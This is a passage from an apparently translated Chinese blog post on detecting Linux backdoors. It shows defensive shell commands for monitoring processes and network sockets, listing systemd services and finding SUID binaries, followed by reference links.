b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">我还喜欢使用<code class="du lk ll lm ln b">watch</code>命令来主动监控网络套接字和进程。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="7375" class="kw ju hi ln b fi ly lz l ma mb"># monitor process<br/>  $ watch -n 1 "ps auxfww | grep suspected-process"<br/># monitor net socket<br/>  $ watch -n 1 "netstat -antp"<br/># monitor net socket with sus IP<br/>  $ watch -n1 "ss -atp | grep '10.14\|168.24'"</span></pre><p id="46d3" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">对于作为服务运行的后门，我们可以尝试用下面的命令列出所有的服务，看看是否有不需要的服务。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="f097" class="kw ju hi ln b fi ly lz l ma mb">$ systemctl list-unit-files --type=service</span></pre><p id="9890" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">或者我们也可以直接访问服务目录。这取决于服务器使用的是什么操作系统，但是我们可以开始查看<code class="du lk ll lm ln b">/lib/systemd/</code>并按照修改日期对它们进行排序。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="cb4f" class="kw ju hi ln b fi ly lz l ma mb">$ find /lib/systemd -type f -iname '*\.service' -exec ls -lrt "{}" +;</span></pre><h2 id="3308" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">寻找SUID</h2><p id="1c5c" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">为了找到一些可疑的SUID，我们可以使用<code class="du lk ll lm ln b">find</code>命令。它还可以检测以点开始的SUID！</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="739d" class="kw ju hi ln b fi ly lz l ma mb">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm 4755 2&gt;/dev/null</span></pre><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es nf"><img src="../Images/f156855410e1fbcd9292f633164cca4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LiFR3iSOkPDe9bRRTMdFqg.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Finding SUID binary</figcaption></figure><p id="1094" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">这里更新一个，用<code class="du lk ll lm ln b">-perm 4755</code>，你将找不到权限设置为<code class="du lk ll lm ln b">4755</code>、<code class="du lk ll lm ln b">4765</code>、<code class="du lk ll lm ln b">4701</code>等的文件。</p><p id="0ceb" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">因此，我们可以将其更改为<code class="du lk ll lm ln b">-perm -u=s</code>，它将查找SUID位(即<code class="du lk ll lm ln b">s</code> / <code class="du lk ll lm ln b">4</code>部分)。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="3242" class="kw ju hi ln b fi ly lz l ma mb">$ find / -type f -perm -u=s 2&gt;/dev/null</span></pre><p id="5014" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">好了，这个帖子就这么多了，希望你喜欢。</p><p id="5e86" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated"><em class="mh">最初发布于:</em><a class="ae iu" href="https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/" rel="noopener ugc nofollow" target="_blank"><em class="mh">https://fahmifj . github . io/blog/Linux-back doors-and-where-to-find-them/</em></a><em class="mh">(2022年14月0日更新)</em></p></div><div class="ab cl nh ni gp nj" role="separator"><span class="nk bw bk nl nm nn"/><span class="nk bw bk nl nm nn"/><span class="nk bw bk nl nm"/></div><div class="hb hc hd he hf"><h2 id="b437" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">参考</h2><ul class=""><li id="ff48" class="mo mp hi ix b iy kr jc ks jg no jk np jo nq js mt mu mv mw bi translated"><a class="ae iu" href="https://www.techslang.com/definition/what-is-a-reverse-shell/" rel="noopener ugc nofollow" target="_blank">https://www . tech slang . com/definition/what-is-a-reverse-shell/</a></li><li id="cb7f" class="mo mp hi ix b iy mx jc my jg mz jk na jo nb js mt mu mv mw bi translated"><a class="ae iu" rel="noopener" href="/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium . com/risan/upgrade-your-ssh-key-to-ed 25519-c 6 E8 d 60d 3c 54</a></li><li id="2c50" class="mo mp hi ix b iy mx jc my jg mz jk na jo nb js mt mu mv mw bi translated">【https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/】</li><li id="4179" class="mo mp hi ix b iy mx jc my jg mz jk na jo nb js mt mu mv mw bi translated"><a class="ae iu" href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c" rel="noopener">https://airman 604 . medium . com/9-ways-to-back door-a-Linux-box-f 5 f 83 BAE 5a 3c</a></li><li id="d088" class="mo mp hi ix b iy mx jc my jg mz jk na jo nb js mt mu mv mw bi translated"><a class="ae iu" href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb" rel="noopener ugc nofollow" target="_blank">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li></ul></div></div>    
</body>
</html>